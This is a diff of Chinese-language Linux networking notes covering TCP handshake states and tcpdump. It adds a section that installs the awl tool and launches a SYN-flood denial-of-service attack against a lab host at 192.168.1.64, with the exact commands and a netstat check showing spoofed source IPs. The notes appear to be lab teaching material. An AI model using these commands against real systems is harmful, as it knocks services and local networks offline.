@@ -255,11 +255,11 @@ traceroute to naver.com (125.209.222.141), 30 hops max, 60 byte packets
   3. 最后Client 再进行一次确认，设置  ack=y+1.
   
   > 服务器端：LISTEN：侦听来自远方的TCP端口的连接请求
-  
+  > 
   > 客户端：SYN-SENT：在发送连接请求后等待匹配的连接请求
-  
+  > 
   > 服务器端：SYN-RECEIVED：在收到和发送一个连接请求后等待对方对连接请求的确认
-  
+  > 
   > 客户端/服务器端：ESTABLISHED：代表一个打开的连接
 
 - tcpdump 抓包工具，常用参数：
@@ -298,19 +298,32 @@ traceroute to naver.com (125.209.222.141), 30 hops max, 60 byte packets
 
   下载地址：https://gitlab.com/davical-project/awl/tags
 
-  - 安装
-    ```
-    [root@localhost63 ~]#tar zxvf awl-0.2.tar.gz  #解压
-    [root@localhost63 ~]#cd awl-0.2
-    [root@localhost63 awl-0.2]#./configure    # 查检软件包安装环境
-    [root@localhost63 awl-0.2]#make  -j  4    # make  把源代码编译成可执行的二进制文件, -j 4以4个进程同时编译，速度快
-    [root@localhost63 awl-0.2]#make install   # 安装
-    [root@localhost63 awl-0.2]# which awl     # 查看安装的命令
-    /usr/local/bin/awl
-    ```
-  - awl参数如下:
-    - i 发送包的接口,如果省略默认是eth0
-    - m 指定目标mac地址, 注：如果-m没有指定mac，默认目标MAC地址是“FF.FF.FF.FF.FF.FF”，表示向同一网段内的所有主机发出ARP广播，进行SYN攻击，还容易使整个局域网瘫痪。
-    - d 被攻击机器的IP
-    - p 被攻击机器的端口
+- 安装
+  ```
+  [root@localhost63 ~]#tar zxvf awl-0.2.tar.gz  #解压
+  [root@localhost63 ~]#cd awl-0.2
+  [root@localhost63 awl-0.2]#./configure    # 查检软件包安装环境
+  [root@localhost63 awl-0.2]#make  -j  4    # make  把源代码编译成可执行的二进制文件, -j 4以4个进程同时编译，速度快
+  [root@localhost63 awl-0.2]#make install   # 安装
+  [root@localhost63 awl-0.2]# which awl     # 查看安装的命令
+  /usr/local/bin/awl
+  ```
+- awl参数如下:
+  - i 发送包的接口,如果省略默认是eth0
+  - m 指定目标mac地址, 注：如果-m没有指定mac，默认目标MAC地址是“FF.FF.FF.FF.FF.FF”，表示向同一网段内的所有主机发出ARP广播，进行SYN攻击，还容易使整个局域网瘫痪。
+  - d 被攻击机器的IP
+  - p 被攻击机器的端口
+- 开始攻击
+  ```
+  [root@localhost63 ~]# ping 192.168.1.64
 
+  [root@localhost63 ~]# arp -n     #   获取对方的IP地址解析成MAC地址
+  Address                  HWtype  HWaddress           Flags Mask            Iface
+  192.168.1.17             ether   e0:b9:a5:ac:c5:76        C                     eth0
+  192.168.1.64             ether   00:0c:29:57:f5:b5        C                     eth0
+  
+  [root@localhost63 ~]# awl -i ens33 -m 00:0c:29:57:f5:b5 -d 192.168.1.64 -p 80
+  
+  [root@localhost64 ~]# netstat -anutp | grep 80        #   在localhost64上查看：发现很多伪装成公网的IP在攻击
+
+  ```
